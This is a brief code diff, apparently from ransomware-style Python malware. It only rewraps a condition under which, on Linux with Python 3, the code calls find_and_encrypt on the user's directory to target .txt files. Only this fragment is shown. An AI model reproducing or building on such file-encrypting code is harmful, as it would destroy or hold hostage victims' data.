@@ -27,7 +27,9 @@ def check_os(osname: str) -> str | None:
     ]
 
     # # check python version before called function.
-    if ((is_linux) and (sys.version[0] == '3')):
+    if ((is_linux) and (
+        sys.version[0] == '3')
+    ):
         find_and_encrypt(
             path=USER_DIR,
             ext_files=['.txt'],
